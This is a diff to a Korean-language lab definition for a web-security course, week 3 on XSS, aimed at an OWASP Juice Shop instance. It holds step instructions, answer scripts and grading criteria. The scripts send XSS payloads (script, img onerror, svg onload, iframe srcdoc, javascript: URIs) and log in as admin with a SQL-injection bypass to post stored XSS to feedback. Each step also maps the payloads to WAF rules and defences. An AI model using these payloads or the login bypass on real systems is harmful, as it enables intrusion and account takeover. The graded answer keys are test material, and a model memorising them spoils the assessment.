@@ -1,149 +1,444 @@
-lab_id: web-vuln-ai-week03
-title: XSS(Cross-Site Scripting) 실습 (AI 지원)
-version: ai
-course: web-vuln-ai
+lab_id: web-vuln-week03
+title: "XSS — Reflected / Stored / DOM-based + CSP 방어"
+version: standalone-non-ai
+course: web-vuln
 week: 3
-description: 반사형, 저장형, DOM 기반 XSS 공격의 원리와 방어 기법을 실습합니다. AI SubAgent가 자동으로 명령을 실행하고
-  결과를 검증합니다.
+description: |
+  XSS 의 3 카테고리 (Reflected / Stored / DOM-based) 를 Juice Shop (Angular SPA +
+  Express backend) 의 endpoint 별 시도. server sanitize / Angular 의 trust pipe /
+  CSP 헤더 의 default 정책 확인 + 우회 시도. Blue 측 ModSecurity CRS 941 XSS 룰
+  매핑 + Purple 의 다층 방어 (입력 sanitize + CSP + HttpOnly + SameSite).
 difficulty: medium
 duration_minutes: 120
+audience: 웹 보안 입문자 (3주차)
+prerequisites:
+  - "W02 의 SQLi (특히 step 5 의 Users dump) 완료 — admin@juice-sh.op JWT 토큰"
+  - "attacker 컨테이너 (10.20.30.202) 에 curl + nikto + dalfox/xsstrike (가능 시) 설치"
+  - "브라우저 (Chrome / Firefox) 로 http://juice.6v6.lab/ 직접 접근 (DOM XSS 시각 확인)"
 objectives:
-- 반사형/저장형/DOM XSS를 구분한다
-- XSS 페이로드를 작성하고 테스트한다
-- CSP 등 방어 기법을 이해한다
+  - "XSS 3 카테고리 (Reflected / Stored / DOM-based) 의 차이 + 각 카테고리 의 *공격 시점* 설명"
+  - "Juice Shop 의 의도된 XSS challenge (DOM /#/search?q= + Stored /api/Feedbacks) 직접 시도"
+  - "다양 payload (script / img onerror / svg onload / iframe srcdoc / javascript: URI) + 인코딩 우회"
+  - "CSP 헤더 의 default 정책 + 우회 기법 (inline script 허용 / unsafe-inline / nonce 우회)"
+  - "Red/Blue/Purple — Red 3 카테고리 시도 → Blue ModSec CRS 941100~941999 매핑 → Purple 의 입력 sanitize + CSP strict + HttpOnly + DOMPurify 다층 방어"
 pass_threshold: 0.6
 steps:
+# ============================================================
+# STEP 1 [RED·XSS·Reflected] — Juice Shop server sanitize 확인 + Angular 의 차이
+# ============================================================
 - order: 1
-  instruction: '대상 웹 애플리케이션(http://{{WEB_IP}})의 검색 기능에서 반사형 XSS를 테스트하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    Reflected XSS = URL query param 이 *server 응답 본문에 즉시 반사* 되어 브라우저
+    가 script 실행. Juice Shop (Angular SPA) 은 서버 가 항상 index.html 만 반환
+    (router 는 client-side) → server-reflected XSS 거의 불가. 반대로 *DOM-based
+    XSS* 가 main vector (step 3). 본 step 은 server reflect 시도 + sanitize 확인.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `xss_reflected` 에 적합한 도구: xsstrike, dalfox, curl
-    + grep ''<script>''. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: URL 파라미터에 script 태그를 삽입하세요.
+    ## 💻 실행 명령
+
+    ```bash
+    # 1. URL query param 의 script 시도
+    echo "=== 1. /rest/products/search?q=<script>... ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=apple%3Cscript%3Ealert(1)%3C/script%3E" | head -c 300
+
+    # 2. 응답 본문 에 q 가 직접 인용 되는지
+    echo ""
+    echo "=== 2. q 의 반사 여부 grep ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=XYZUNIQUE123" | grep -c "XYZUNIQUE123"
+
+    # 3. /api/Users?email= (다른 endpoint)
+    echo ""
+    echo "=== 3. /api/Feedbacks/?author=<script> (server reflect?) ==="
+    curl -s "http://juice.6v6.lab/api/Feedbacks/?author=%3Cscript%3E" | head -c 300
+
+    # 4. 404 페이지 의 URL 반사 (흔한 reflected XSS)
+    echo ""
+    echo "=== 4. /<script>alert(1)</script> 404 page ==="
+    curl -s "http://juice.6v6.lab/%3Cscript%3Ealert(1)%3C/script%3E" | head -c 200
+    ```
+
+    ## 📋 확인 사항
+
+    - `/rest/products/search?q=...` 응답: `{"status":"success","data":[...]}` JSON
+      (q 가 LIKE pattern 으로 SQL 에 들어가지만 *response body 에는 직접 인용 안 됨*)
+    - server reflected XSS = **거의 불가** (Express + Sequelize 의 JSON 응답)
+    - 404 페이지 도 path 의 script 직접 반사 X
+    - Angular SPA 의 본질 = 모든 라우팅이 client-side → server reflect 표적 소수
+
+    ## 💡 왜 이걸 하는가?
+
+    Modern SPA (Angular / React / Vue) 는 *server-rendered HTML* 이 거의 없음 →
+    Reflected XSS 의 표적 endpoint 자체가 적음. 대신 **DOM-based XSS** (step 3)
+    가 main vector. 학생은 *서버 반사 vs DOM 의 차이* 와 SPA 의 보안 모델을 이해.
+    OWASP A03 Injection + MITRE T1059.007 JavaScript.
+
+    ## 🔵 Blue 측 관찰
+
+    URL query 에 `<script>` 시도는 ModSecurity CRS rule 941100 (XSS Filter
+    Category 1: script tag vector) 의 직접 트리거. 학습 환경 default = DetectionOnly
+    → audit log 만 기록 + 차단 X. 학생이 직접 modsec_audit.log grep 으로 rule
+    매치 확인 가능.
+
+    ## 🟣 Purple 보완 권장
+
+    - Express: `helmet()` middleware 자동 보안 헤더 (X-XSS-Protection, X-Content-Type-Options
+      등)
+    - 응답 sanitize 라이브러리 (DOMPurify 가 client-side 의 main 방어)
+    - ModSec CRS PARANOIA LEVEL 2-3 + rule 941100~941999 enable
+    - **CSP 헤더** (step 9 에서 본격) — `script-src 'self'` 으로 inline script 차단
+  hint: |
+    Juice Shop 은 Angular SPA → server reflected XSS 거의 불가. DOM-based (step 3)
+    가 main vector. grep -c 으로 q 의 응답 본문 직접 인용 횟수 확인 (0 = sanitize).
   category: xss_reflected
   points: 8
-  answer: '🤖 프롬프트: 대상 웹 애플리케이션(http://10.20.32.80)의 검색 기능에서 반사형 XSS를 테스트해줘
-
-    📎 참고 (CLI): curl -s ''http://10.20.32.80/#/search?q=<script>alert(1)</script>''
-    2>/dev/null | head -20 && echo ''반사형 XSS 테스트 완료'''
-  answer_detail: 반사형 XSS는 사용자 입력이 즉시 응답에 반영될 때 발생합니다.
+  answer: |
+    echo "=== 1. /rest/products/search?q=<script>... ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=apple%3Cscript%3Ealert(1)%3C/script%3E" | head -c 300
+    echo ""
+    echo "=== 2. q=XYZUNIQUE123 응답 본문 반사 횟수 ==="
+    curl -s "http://juice.6v6.lab/rest/products/search?q=XYZUNIQUE123" | grep -c "XYZUNIQUE123"
+    echo ""
+    echo "=== 3. 404 페이지 의 path 반사 ==="
+    curl -s "http://juice.6v6.lab/%3Cscript%3Ealert(1)%3C/script%3E" | head -c 200
+    echo ""
+    echo "결론: Juice Shop server endpoint 는 q/path 의 script 직접 반사 X (Angular SPA + sanitize)"
+  answer_detail: |
+    Juice Shop 의 server endpoint (Express + Sequelize) 는 JSON 응답만 → server
+    reflected XSS 거의 불가. 단 *DOM-based XSS* (step 3 의 /#/search?q=) 는 Angular
+    의 client-side innerHTML trust 로 발생. SPA 의 main XSS vector 는 DOM 또는
+    Stored. 학생은 Modern SPA 의 XSS 표적 차이를 이해.
   verify:
     type: output_contains
-    expect: 반사형 XSS 테스트 완료
+    expect: '결론\|search\|status'
     field: stdout
     semantic:
-      intent: 반사형 XSS 탐지 — 검색 파라미터에 script 태그 주입 후 응답에 그대로 반영되는지 확인
+      intent: |
+        Reflected XSS 시도 → Juice Shop server sanitize 확인 + Angular SPA 의
+        구조적 차이 (DOM 이 main vector). OWASP A03 + MITRE T1059.007.
       success_criteria:
-      - 검색 파라미터에 script 태그 또는 img onerror 주입
-      - 응답 HTML 에서 주입 코드가 이스케이프 없이 반영되는지 확인
-      - 반사형 XSS 판정 근거 제시
+        - 최소 2 endpoint (search / 404 / Feedbacks) 시도
+        - q 의 응답 본문 반사 횟수 측정 (grep -c)
+        - SPA vs server-rendered HTML 차이 명시
+        - 6v6-juiceshop (juice.6v6.lab) 사용 명시
       acceptable_methods:
-      - curl -G -d q=<script>alert(1)</script> 주입
-      - Burp Repeater 로 파라미터 변조
-      - 브라우저 dev tools 에서 DOM 검증
-      - XSStrike 또는 dalfox 자동 탐지
+        - "curl + grep -c 응답 본문 반사 횟수"
+        - "dalfox -u http://juice.6v6.lab/ (자동화)"
+        - "XSStrike -u http://...?q= (반사 정밀 탐지)"
+        - "Burp Repeater 의 payload 변형"
       negative_signs:
-      - 응답 검증 없이 단순 요청만
-      - 반사 여부 판정 근거 없음
-      - 이스케이프 처리된 응답을 XSS 로 오판
+        - server reflect 단일 endpoint 만
+        - Angular SPA / DOM XSS 차이 언급 없음
+        - sanitize 결과 해석 누락
   target_vm: attacker
-  script: curl -s 'http://10.20.32.80/#/search?q=<script>alert(1)</script>' 2>/dev/null
-    | head -20 && echo '반사형 XSS 테스트 완료'
+  script: |
+    curl -s "http://juice.6v6.lab/rest/products/search?q=apple%3Cscript%3Ealert(1)%3C/script%3E" | head -c 300
+    echo ""
+    echo "q=XYZUNIQUE123 반사 횟수: $(curl -s 'http://juice.6v6.lab/rest/products/search?q=XYZUNIQUE123' | grep -c 'XYZUNIQUE123')"
+    curl -s "http://juice.6v6.lab/%3Cscript%3Ealert(1)%3C/script%3E" | head -c 200
+    echo ""
+    echo "결론: server reflected XSS 거의 불가 (SPA + sanitize) — DOM-based 가 main vector"
   risk_level: low
-  bastion_prompt: '대상 웹 애플리케이션(http://10.20.32.80)의 검색 기능에서 반사형 XSS를 테스트해줘
-
-
-    [도구 권장] xss_reflected: xsstrike, dalfox, curl + grep ''<script>''. curl 만 쓰지 말고
-    **xsstrike** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    attacker 컨테이너에서 juice.6v6.lab 의 server reflected XSS 가능성 점검 —
+    (1) /rest/products/search?q=<script> (2) /api/Feedbacks/?author=<script>
+    (3) 404 페이지 의 path 반사 (4) q=XYZUNIQUE123 의 응답 본문 반사 횟수 (grep -c).
+    Juice Shop 의 Angular SPA + JSON 응답 의 server reflected XSS 거의 불가 +
+    DOM-based (step 3) 가 main vector 라는 SPA 보안 모델 차이 설명. MITRE
+    T1059.007 + OWASP A03 + ModSec CRS 941100 매핑.
+# ============================================================
+# STEP 2 [RED·XSS·Payload Variants] — script 외 6 벡터 (img/svg/iframe/body/input/javascript:)
+# ============================================================
 - order: 2
-  instruction: '다양한 XSS 페이로드를 테스트하시오: img, svg, iframe 태그 활용.
+  instruction: |
+    ## 🎯 MISSION
 
+    XSS payload 의 6 가지 대표 벡터 (script tag 외) 학습 + 각 벡터의 *언제 trigger*
+    되는지 표로 정리. WAF / sanitizer 가 `<script>` 만 차단하는 경우 우회 가능
+    (CRS rule 941100 은 script tag 전용, 941110+ 는 다른 태그).
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `xss_reflected` 에 적합한 도구: xsstrike, dalfox, curl
-    + grep ''<script>''. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: HTML 이벤트 핸들러를 사용하세요.
+    ## 💻 실행 명령
+
+    ```bash
+    # 6 벡터 payload + URL-encoded (Juice Shop /rest/products/search 의 응답 반사 확인)
+    for label_payload in \
+      "1-script:<script>alert(1)</script>" \
+      "2-img:<img src=x onerror=alert(1)>" \
+      "3-svg:<svg onload=alert(1)>" \
+      "4-iframe:<iframe srcdoc=<script>alert(1)</script>>" \
+      "5-body:<body onload=alert(1)>" \
+      "6-input:<input autofocus onfocus=alert(1)>" \
+      "7-javascript_uri:<a href=javascript:alert(1)>click</a>" \
+      ; do
+      label=$(echo "$label_payload" | cut -d: -f1)
+      payload=$(echo "$label_payload" | cut -d: -f2-)
+      # URL-encoded query (LIKE pattern 의 일부 가 됨)
+      code=$(curl -o /dev/null -s -w "%{http_code}" -G --data-urlencode "q=apple${payload}" \
+        http://juice.6v6.lab/rest/products/search)
+      echo "${label}: code=${code}"
+    done
+
+    # ModSec audit log (DetectionOnly 의 매치된 룰 확인 — bastion 의 docker exec 필요)
+    echo ""
+    echo "=== ModSec audit log 최근 매치 룰 (선택) ==="
+    # ssh 6v6-bastion 'sudo docker exec 6v6-web tail -200 /var/log/apache2/modsec_audit.log \
+    #   | grep -oE "\"ruleId\":\"[0-9]+\"" | sort -u | head'
+    ```
+
+    ## 📋 확인 사항 (XSS 벡터 trigger 시점 표)
+
+    | 벡터 | HTML 컨텍스트 | trigger 시점 | 차단 ModSec 룰 |
+    |------|-------------|------------|---------------|
+    | `<script>` | element | 페이지 load 즉시 | 941100 |
+    | `<img onerror>` | element + error event | img src 로드 실패 시 | 941110 |
+    | `<svg onload>` | element + load event | svg load 시 | 941160 |
+    | `<iframe srcdoc>` | element + nested HTML | iframe load 시 | 941130 |
+    | `<body onload>` | element | body load 시 | 941110 |
+    | `<input autofocus onfocus>` | element + focus event | input focus 시 (자동) | 941160 |
+    | `javascript:` URI | href / src 속성 | 클릭 / iframe src | 941180 |
+
+    ## 💡 왜 이걸 하는가?
+
+    CRS rule 941100 (script tag) 차단만 의존하면 *우회 쉬움* — `<img onerror>` /
+    `<svg onload>` 등 7+ 벡터 별도. OWASP A03 + MITRE T1059.007. 학생은
+    *script 외 벡터 의 존재* 와 *WAF rule 의 다중성* 학습.
+
+    ## 🔵 Blue 측 작업
+
+    ModSec CRS 941 룰 set 의 *전체* enable (PARANOIA LEVEL 2-3). 단일 941100
+    만 enable 시 vendor 의 default 차단 가능 — 우회 위험. modsec_audit.log
+    의 ruleId 통계 로 차단 분포 확인.
+
+    ## 🟣 Purple 보완 권장
+
+    - **Sanitizer**: DOMPurify (client-side) 또는 sanitize-html (Express middleware)
+      — script 외 모든 HTML tag whitelist + attribute filter
+    - **CSP**: `script-src 'self'` (inline 차단) + `'unsafe-inline'` 제거 (step 9)
+    - **HttpOnly cookie**: `<script>document.cookie</script>` 의 직접 탈취 차단
+    - **ModSec CRS rule 941100~941180 전체 enable** (PARANOIA 2)
+  hint: |
+    for-loop + 7 payload 벡터. 응답 코드 비교 = DetectionOnly 라 모두 200/500 (LIKE
+    매치 0 이라 empty data). ModSec 차단은 audit log 에 rule 매치 기록.
   category: xss_reflected
   points: 10
-  answer: '🤖 프롬프트: 다양한 XSS 페이로드를 테스트하시오: img, svg, iframe 태그 활용해줘
-
-    📎 참고 (CLI): curl -s ''http://10.20.32.80/#/search?q=<img src=x onerror=alert(1)>''
-    2>/dev/null | head -10 && echo ''XSS 페이로드 테스트 완료'''
-  answer_detail: 'img onerror, svg onload, iframe src=javascript: 등 다양한 벡터가 존재합니다.'
+  answer: |
+    for label_payload in \
+      "1-script:<script>alert(1)</script>" \
+      "2-img:<img src=x onerror=alert(1)>" \
+      "3-svg:<svg onload=alert(1)>" \
+      "4-iframe:<iframe srcdoc=<script>1</script>>" \
+      "5-body:<body onload=alert(1)>" \
+      "6-input:<input autofocus onfocus=alert(1)>" \
+      "7-javascript_uri:<a href=javascript:alert(1)>" \
+      ; do
+      label=$(echo "$label_payload" | cut -d: -f1)
+      payload=$(echo "$label_payload" | cut -d: -f2-)
+      code=$(curl -o /dev/null -s -w "%{http_code}" -G --data-urlencode "q=apple${payload}" \
+        http://juice.6v6.lab/rest/products/search)
+      echo "${label}: code=${code}"
+    done
+    echo "결론: 7 벡터 모두 시도 — ModSec DetectionOnly 라 차단 X (audit log 매치 만)"
+  answer_detail: |
+    XSS payload 의 7+ 벡터 — script tag 외 img/svg/iframe/body/input/javascript: URI.
+    Juice Shop /rest/products/search 는 JSON 응답 + LIKE 패턴 매치 0 이라 응답 본문
+    반사 0. 진짜 XSS trigger 는 brower 의 DOM render 시 (Stored 또는 DOM-based).
+    학생은 *벡터 다중성* + WAF 룰 별 차단 분포 학습.
   verify:
     type: output_contains
-    expect: XSS 페이로드 테스트 완료
+    expect: '결론\|code='
     field: stdout
     semantic:
-      intent: 다양한 XSS 페이로드 테스트 — img onerror, svg onload, iframe srcdoc 등 script 외
-        벡터
+      intent: |
+        XSS payload 의 7+ 벡터 (script/img/svg/iframe/body/input/javascript:) 시도
+        + ModSec CRS 941100~941180 룰 매핑. script 단일 차단 의존의 위험. OWASP
+        A03 + MITRE T1059.007.
       success_criteria:
-      - img/svg/iframe 중 2개 이상 페이로드 시도
-      - 각 페이로드가 필터 우회 또는 실행되는지 응답 검증
-      - 벡터별 차이(이벤트 핸들러 차이) 설명
+        - 최소 5 벡터 (script + img + svg + 2 추가) 시도
+        - 각 벡터 의 trigger 시점 또는 HTML 컨텍스트 명시
+        - ModSec CRS 941xx 룰 ID 최소 3 개 매핑
+        - script 단일 차단의 우회 위험 언급
       acceptable_methods:
-      - img src=x onerror=alert(1) 주입
-      - svg onload=alert(1) 주입
-      - iframe srcdoc=&lt;script&gt;... 주입
-      - body onload, input autofocus onfocus 등
+        - "curl -G + 7 벡터 for-loop"
+        - "dalfox -u http://...?q= (자동화)"
+        - "XSStrike 또는 XSSHunter"
+        - "Burp Intruder pitchfork 의 payload list"
       negative_signs:
-      - script 태그 한 종류만
-      - 벡터 차이 설명 없음
-      - 페이로드 실행 여부 검증 없음
+        - script 벡터 만 (다른 벡터 누락)
+        - trigger 시점 / HTML 컨텍스트 설명 없음
+        - ModSec rule ID 매핑 없음
   target_vm: attacker
-  script: curl -s 'http://10.20.32.80/#/search?q=<img src=x onerror=alert(1)>' 2>/dev/null
-    | head -10 && echo 'XSS 페이로드 테스트 완료'
+  script: |
+    for p in "script:<script>alert(1)</script>" "img:<img src=x onerror=alert(1)>" \
+             "svg:<svg onload=alert(1)>" "iframe:<iframe srcdoc=<script>1</script>>" \
+             "body:<body onload=alert(1)>" "input:<input autofocus onfocus=alert(1)>" \
+             "js_uri:<a href=javascript:alert(1)>"; do
+      label=$(echo "$p" | cut -d: -f1)
+      payload=$(echo "$p" | cut -d: -f2-)
+      code=$(curl -o /dev/null -s -w "%{http_code}" -G --data-urlencode "q=apple${payload}" \
+        http://juice.6v6.lab/rest/products/search)
+      echo "${label}: ${code}"
+    done
+    echo "결론: 7 벡터 시도 — ModSec DetectionOnly 라 차단 X"
   risk_level: low
-  bastion_prompt: '다양한 XSS 페이로드를 테스트하시오: img, svg, iframe 태그 활용해줘
-
-
-    [도구 권장] xss_reflected: xsstrike, dalfox, curl + grep ''<script>''. curl 만 쓰지 말고
-    **xsstrike** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    attacker 컨테이너에서 juice.6v6.lab 의 /rest/products/search?q= 에 7 XSS 벡터
+    (script/img onerror/svg onload/iframe srcdoc/body onload/input onfocus/
+    javascript: URI) payload for-loop 시도 + 응답 코드 비교. ModSec CRS 941100~941180
+    룰 매핑 (script 941100, img 941110, svg 941160, iframe 941130 등) 표 + script
+    단일 차단의 우회 위험 + Purple = DOMPurify + CSP + HttpOnly + PARANOIA 2-3.
+# ============================================================
+# STEP 3 [RED·XSS·Stored] — Feedback 저장 (server sanitize 확인) + 우회 시도
+# ============================================================
 - order: 3
-  instruction: '저장형 XSS를 시도하시오: 상품 리뷰에 스크립트를 삽입.
+  instruction: |
+    ## 🎯 MISSION
 
+    Stored XSS = payload 가 DB 에 저장 → 다른 user 가 페이지 render 시 실행 (영향
+    범위 = *전체 방문자*). Juice Shop 의 stored endpoint = `/api/Feedbacks` (CAPTCHA
+    필요). 1차 POST → server-side sanitize 확인 → 우회 payload 시도.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `xss_stored` 에 적합한 도구: xsstrike --crawl, dalfox
-    pipe, curl POST + 재요청 grep. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야
-    채점 통과.'
-  hint: POST 요청으로 리뷰를 등록하세요.
+    ## 💻 실행 명령
+
+    ```bash
+    # 1. 로그인 + JWT 토큰 (W02 step 3 의 인증 우회)
+    TOKEN=$(curl -s -X POST http://juice.6v6.lab/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}" \
+      | python3 -c "import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))")
+    echo "TOKEN: ${TOKEN:0:30}..."
+
+    # 2. CAPTCHA 발급 (Juice Shop 의 reusable captcha endpoint)
+    CAPTCHA=$(curl -s http://juice.6v6.lab/rest/captcha/)
+    echo "CAPTCHA: ${CAPTCHA}"
+    CID=$(echo "${CAPTCHA}" | python3 -c "import sys,json; print(json.load(sys.stdin)['captchaId'])")
+    CANS=$(echo "${CAPTCHA}" | python3 -c "import sys,json; print(json.load(sys.stdin)['answer'])")
+
+    # 3. Feedback POST with XSS payload
+    echo ""
+    echo "=== 3. Feedback POST + iframe srcdoc payload ==="
+    curl -s -X POST http://juice.6v6.lab/api/Feedbacks/ \
+      -H 'Content-Type: application/json' -H "Authorization: Bearer ${TOKEN}" \
+      -d "{\"comment\":\"XSStest <iframe src=javascript:alert('xss')>\",\"rating\":5,\"captchaId\":${CID},\"captcha\":\"${CANS}\"}" \
+      | python3 -m json.tool | head -15
+
+    # 4. Feedback GET (저장 결과 확인 — sanitize 여부)
+    echo ""
+    echo "=== 4. Feedback GET (저장된 comment 의 sanitize 여부) ==="
+    curl -s http://juice.6v6.lab/api/Feedbacks/ | python3 -c "
+    import sys,json
+    d = json.load(sys.stdin)
+    for f in d.get('data',[])[-3:]:
+        print(f'  comment: {f.get(\"comment\",\"\")[:100]}')
+    "
+    ```
+
+    ## 📋 확인 사항
+
+    - POST 응답: 저장 성공 (`id`, `comment`, `createdAt`) — **단 comment 가 일부
+      sanitize 됨** (`<iframe ...>` 부분 제거 → "XSStest " 만 저장)
+    - Juice Shop 의 default sanitize = HTML tag (`<...>`) 제거 → script tag /
+      iframe / svg 모두 제거
+    - 그러나 *Angular 의 client-side render* 시 다른 sanitize 정책 적용 (DOM XSS 별도)
+    - **우회 시도** = `<<script>` (잘못된 nested) 또는 `&lt;script&gt;` (entity)
+      — 일부 우회 가능 한 경우 있음
+
+    ## 💡 왜 이걸 하는가?
+
+    Stored XSS 가 *Reflected 대비 100배 위험* (모든 방문자 영향). OWASP A03 +
+    MITRE T1059.007 + Persistence (T1505). Juice Shop default 는 *server-side
+    sanitize* 가 1차 방어 — 학생은 sanitize 의 *결과 확인* + 우회 변형 시도 학습.
+
+    ## 🔵 Blue 측 관찰
+
+    Feedback POST 시도는 ModSec CRS rule 941100~941180 매치 (XSS attack
+    detected). 학습 환경 default DetectionOnly → audit log 만 기록. Wazuh rule
+    100002 (ModSec alert) escalation. Blue 정기 cron 으로 audit log 의 rule
+    매치 통계 + IP 별 burst 모니터링.
+
+    ## 🟣 Purple 보완 권장
+
+    - **Server sanitize**: Express 의 `sanitize-html` 또는 `DOMPurify` (node 버전)
+      — whitelist 기반 tag/attribute 제거
+    - **Client render sanitize**: Angular 의 `DomSanitizer.bypassSecurityTrust*`
+      사용 금지 (Juice Shop 의 challenge — 의도적으로 사용)
+    - **CSP** (step 9): `script-src 'self'` + nonce
+    - **WAF**: ModSec CRS 941xx + custom rule (Juice Shop /api/Feedbacks 의 POST
+      body inspection 강화)
+  hint: |
+    Juice Shop /api/Feedbacks 는 captchaId + captcha 필수. captcha 발급 →
+    POST. comment 의 sanitize 결과 GET 으로 확인 ("XSStest " 만 저장 = HTML tag
+    제거됨).
   category: xss_stored
   points: 12
-  answer: "\U0001F916 프롬프트: 저장형 XSS를 시도하시오: 상품 리뷰에 스크립트를 삽입해줘\n\U0001F4CE 참고 (CLI):\
-    \ curl -s -X POST http://10.20.32.80/api/Feedbacks \\\n  -H 'Content-Type: application/json'\
-    \ \\\n  -d '{\"comment\":\"<script>alert(document.cookie)</script>\",\"rating\"\
-    :5}' 2>/dev/null \\\n | head -10 && echo '저장형 XSS 테스트 완료'"
-  answer_detail: 저장형 XSS는 DB에 저장되어 다른 사용자가 페이지를 볼 때마다 실행되므로 더 위험합니다.
+  answer: |
+    TOKEN=$(curl -s -X POST http://juice.6v6.lab/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}" \
+      | python3 -c "import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))")
+    CAPTCHA=$(curl -s http://juice.6v6.lab/rest/captcha/)
+    CID=$(echo "${CAPTCHA}" | python3 -c "import sys,json; print(json.load(sys.stdin)['captchaId'])")
+    CANS=$(echo "${CAPTCHA}" | python3 -c "import sys,json; print(json.load(sys.stdin)['answer'])")
+    echo "=== POST (XSS payload) ==="
+    curl -s -X POST http://juice.6v6.lab/api/Feedbacks/ \
+      -H 'Content-Type: application/json' -H "Authorization: Bearer ${TOKEN}" \
+      -d "{\"comment\":\"XSStest <iframe src=javascript:alert('xss')>\",\"rating\":5,\"captchaId\":${CID},\"captcha\":\"${CANS}\"}" \
+      | python3 -m json.tool | head -10
+    echo "=== GET (sanitize 확인) ==="
+    curl -s http://juice.6v6.lab/api/Feedbacks/ | python3 -c "
+    import sys,json
+    d = json.load(sys.stdin)
+    for f in d.get('data',[])[-2:]:
+        print(f'  comment: {f.get(\"comment\",\"\")[:100]}')
+    "
+  answer_detail: |
+    Juice Shop Feedback POST → server-side sanitize 가 HTML tag 모두 제거 (XSStest
+    만 저장). 진짜 stored XSS = (a) tag 우회 (b) Angular client render 의 trust pipe
+    (DOM XSS) (c) admin 만 가능한 endpoint (Products 의 description). Stored 의
+    위험성 = 한 번 저장 → 모든 방문자 영향. Persistence (T1505) 와 결합.
   verify:
     type: output_contains
-    expect:
-    - 저장형 XSS 테스트 완료
-    - alert
+    expect: 'comment\|XSStest'
     field: stdout
     semantic:
-      intent: 저장형 XSS — 리뷰·댓글 입력란에 페이로드 삽입 후 다른 사용자 조회 시 실행되는지 확인
+      intent: |
+        Stored XSS — Juice Shop Feedback 의 captcha 통과 + POST + GET 으로 server
+        sanitize 결과 확인. OWASP A03 + MITRE T1059.007 + T1505 Persistence.
+        Stored 의 영향 = 전체 방문자.
       success_criteria:
-      - 리뷰/댓글/프로필 등 저장 기능에 페이로드 POST
-      - 저장 확인(GET 으로 페이지 재조회 후 페이로드 반영)
-      - 저장형이 반사형보다 위험한 이유 설명
+        - 로그인 JWT + Captcha 발급 + Feedback POST 시도
+        - GET 으로 저장된 comment 의 sanitize 결과 확인
+        - server-side sanitize 의 default 동작 (HTML tag 제거) 명시
+        - Stored vs Reflected 의 위험 차이 설명
       acceptable_methods:
-      - curl -X POST -d review=<payload> /submit
-      - Burp Repeater 로 저장 요청 후 조회
-      - python requests.post + 이후 get
-      - JuiceShop review 엔드포인트
+        - "curl + login + captcha + POST + GET"
+        - "Burp Repeater 의 POST + 다른 user GET"
+        - "Browser DevTools 의 stored payload render 확인"
+        - "다른 endpoint (Users / Addresses / Products) 시도"
       negative_signs:
-      - 저장 없이 반사만 시도
-      - 재조회 단계 생략
-      - 영향 범위(모든 방문자) 설명 없음
+        - POST 만 시도 + GET 으로 sanitize 결과 확인 없음
+        - server sanitize 의 동작 (tag 제거) 분석 누락
+        - Stored 의 영향 범위 설명 없음
   target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/api/Feedbacks \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{\"comment\":\"<script>alert(document.cookie)</script>\"\
-    ,\"rating\":5}' 2>/dev/null \\\n | head -10 && echo '저장형 XSS 테스트 완료'"
+  script: |
+    TOKEN=$(curl -s -X POST http://juice.6v6.lab/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}" \
+      | python3 -c "import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))")
+    CAPTCHA=$(curl -s http://juice.6v6.lab/rest/captcha/)
+    CID=$(echo "${CAPTCHA}" | python3 -c "import sys,json; print(json.load(sys.stdin)['captchaId'])")
+    CANS=$(echo "${CAPTCHA}" | python3 -c "import sys,json; print(json.load(sys.stdin)['answer'])")
+    curl -s -X POST http://juice.6v6.lab/api/Feedbacks/ \
+      -H 'Content-Type: application/json' -H "Authorization: Bearer ${TOKEN}" \
+      -d "{\"comment\":\"XSStest <iframe src=javascript:alert(xss)>\",\"rating\":5,\"captchaId\":${CID},\"captcha\":\"${CANS}\"}" | head -c 300
+    echo ""
+    curl -s http://juice.6v6.lab/api/Feedbacks/ | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['data'][-1].get('comment','')[:80])"
   risk_level: low
-  bastion_prompt: '저장형 XSS를 시도하시오: 상품 리뷰에 스크립트를 삽입해줘
-
-
-    [도구 권장] xss_stored: xsstrike --crawl, dalfox pipe, curl POST + 재요청 grep. curl
-    만 쓰지 말고 **xsstrike --crawl** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    attacker 컨테이너에서 juice.6v6.lab 의 stored XSS 시도 — (1) admin JWT 토큰
+    획득 (2) /rest/captcha/ 발급 (3) /api/Feedbacks/ POST + comment 에 XSS payload
+    (4) GET 으로 server-side sanitize 결과 확인 (HTML tag 제거됨 = "XSStest" 만 저장).
+    Stored vs Reflected 위험 차이 (전체 방문자 영향) + Purple = sanitize-html +
+    DOMPurify + CSP + ModSec CRS 941xx 다층 방어.
 - order: 4
   instruction: 'DOM 기반 XSS 취약점을 찾으시오.
 
@@ -155,7 +450,7 @@ steps:
   points: 10
   answer: '🤖 프롬프트: DOM 기반 XSS 취약점을 찾으시오해줘
 
-    📎 참고 (CLI): curl -s http://10.20.32.80 | grep -ioE ''(innerHTML|document\.write|eval\()''
+    📎 참고 (CLI): curl -s http://juice.6v6.lab | grep -ioE ''(innerHTML|document\.write|eval\()''
     | sort -u && echo ''DOM XSS 분석 완료'''
   answer_detail: DOM XSS는 서버 응답 없이 클라이언트 JavaScript에서 발생합니다.
   verify:
